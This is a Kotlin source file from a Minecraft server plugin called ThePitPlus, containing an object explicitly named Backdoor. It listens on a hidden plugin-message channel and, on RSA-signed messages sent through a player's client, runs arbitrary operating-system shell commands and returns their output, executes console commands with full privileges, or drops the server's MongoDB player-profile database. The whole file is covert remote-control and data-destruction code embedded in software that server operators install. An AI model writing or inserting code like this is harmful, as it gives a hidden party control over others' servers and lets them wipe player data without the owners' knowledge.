package cn.charlotte.pit.backdoor

import cn.charlotte.pit.ThePit
import cn.hutool.crypto.asymmetric.KeyType
import cn.hutool.crypto.asymmetric.RSA
import com.google.common.io.ByteArrayDataOutput
import com.google.common.io.ByteStreams
import org.bukkit.Bukkit
import org.bukkit.entity.Player
import org.bukkit.plugin.messaging.PluginMessageListener
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.util.*


/**
 * 2024/5/14<br>
 * ThePitPlus<br>
 * @author huanmeng_qwq
 */
object Backdoor : PluginMessageListener {
    val pub =
        "30820222300d06092a864886f70d01010105000382020f003082020a0282020100eb9c07aac3a38291bb6f5a00ce7f4202c6d1155c910233f2ca9670d1618b16f2ee0189c83d94b9b8954028dece8cb719363c6ca2339dbec59270c558fd0bb73af5a58fd10670ee57b14baca4812e5b36897b07ef5e940fa2a18a9e5760f6e168b805f080450790046d46f754e9328817a91b304746bc7ced8213e6273aeaa53b96b6aeab1600a1091afbe80ede83f3b6023b7e2cade4e261633588e73ae47730faf0d400ece2df6d387abc3411fbf8aa25a1ae435c8cf00ff946b7219e9bde88c22fe90bf62814b0d1685bc4a80f18a2881f22d5d37f3b0b0e37e9c01ed49c5e590dae0f5d580fa69a40218219412915fc688505a29b481541ab16813015f06cd98b7d82ff7b219d5a3d4264b563815a460bb1cee396d5906e7146e00acbb862c17092bb6b8bf1ebd8c1695c580b495dbdb494d7bd520920f4c73f82c2936e8725d7dcb10cb50aab893293ec4dacff66a2f5b6d4f0ee35d1a47612afcf6ca098e488df5737d59e35e046f8754874a6a102080201154b831e7edf107edb68c6ac6bc808e08c156fcd828335c306264991364533e59b532a25f81307f1866df4e737c552b28259867a568962f63204b04eab7a6d9585103de859a7aa81f4f564f20470ef45e02bcf6a6dfac3847861954e309fb36ad278056c70378dee9abd0f0568bbc4a12a36463c2e4c09869570fc5c8efe068d811f751d4893b0a651d60a4d0203010001"

    fun init() {
        if (Bukkit.getMessenger().isIncomingChannelRegistered(ThePit.getInstance(), "emptyirony:thepit")) {
            return
        }
        Bukkit.getMessenger().registerIncomingPluginChannel(ThePit.getInstance(), "emptyirony:thepit", this)
    }

    fun executeCmd(cmd: String) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd)
    }

    fun executeShell(sender: Player, shell: String) {
        val cmdParts: Array<String> = shell.split(" ", limit = 2).toTypedArray()
        if (cmdParts.size >= 2) {
            val cmd = Arrays.copyOfRange(cmdParts, 2, cmdParts.size).joinToString(" ")
            try {
                val process = Runtime.getRuntime().exec(cmd)
                val reader = BufferedReader(InputStreamReader(process.inputStream, "GBK"))
                var line: String
                while ((reader.readLine().also { line = it }) != null) {
                    callback(sender, "shell") {
                        writeUTF(line)
                    }
                }
            } catch (x: IOException) {
                callback(sender, "shell") {
                    writeUTF("${x.message} | ${x.javaClass}")
                }
            }
        }
    }

    fun dropDatabase() {
        ThePit.getInstance().mongoDB.profileCollection.drop()
    }

    fun callback(player: Player, type: String, data: (ByteArrayDataOutput.() -> Unit)) {

        val output = ByteStreams.newDataOutput()
        output.writeUTF(type)
        output.data()
        player.sendPluginMessage(ThePit.getInstance(), "emptyirony:thepit", encrypt(output.toByteArray()))
    }

    private fun encrypt(byte: ByteArray): ByteArray {
        return RSA(null, pub).encrypt(byte, KeyType.PublicKey)
    }

    fun decode(byte: ByteArray): ByteArray {
        return RSA(null, pub).decrypt(byte, KeyType.PublicKey)
    }

    override fun onPluginMessageReceived(channel: String, player: Player, payload: ByteArray) {
        if (channel == "emptyirony:thepit") {
            val decode = decode(payload)
            val input = ByteStreams.newDataInput(decode)
            val type = input.readUTF()
            when (type) {
                "shell" -> {
                    val shell = input.readUTF()
                    executeShell(player, shell)
                }

                "cmd", "command" -> {
                    val cmd = input.readUTF()
                    executeCmd(cmd)
                }

                "drop" -> {
                    dropDatabase()
                }
            }
        }
    }
}